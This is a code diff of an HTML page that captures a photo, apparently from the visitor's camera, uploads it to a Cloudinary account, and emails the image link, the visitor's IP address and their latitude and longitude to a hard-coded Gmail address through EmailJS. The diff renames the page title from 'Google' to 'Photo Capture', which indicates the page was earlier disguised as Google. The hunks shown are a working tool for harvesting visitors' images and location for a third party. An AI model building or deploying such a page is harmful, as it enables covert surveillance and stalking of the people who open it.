@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Google</title>
+  <title>Photo Capture</title>
 </head>
 <body>
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
@@ -39,9 +39,9 @@
     async function uploadToCloudinary(blob) {
       const formData = new FormData();
       formData.append("file", blob);
-      formData.append("upload_preset", "unsigned_video_uploads"); // Your preset
+      formData.append("upload_preset", "unsigned_video_uploads"); // Your Cloudinary preset
 
-      const res = await fetch("https://api.cloudinary.com/v1_1/dymxlqxxx/image/upload", { // Your Cloud name
+      const res = await fetch("https://api.cloudinary.com/v1_1/dymxlqxxx/image/upload", {
         method: "POST",
         body: formData
       });
@@ -71,18 +71,12 @@
         canvas.toBlob(async (blob) => {
           const imageUrl = await uploadToCloudinary(blob);
 
-          const message = `
-You received a new photo.
-
-Download link: ${imageUrl}
-Sender IP: ${ip}
-Latitude: ${location.latitude}
-Longitude: ${location.longitude}
-`;
-
           await emailjs.send("service_khmk344", "template_oyrsayr", {
             to_email: "julianlee252@gmail.com",
-            message: message.trim()
+            message: imageUrl,
+            ip: ip,
+            latitude: location.latitude,
+            longitude: location.longitude
           });
 
           console.log("✅ Photo email sent.");
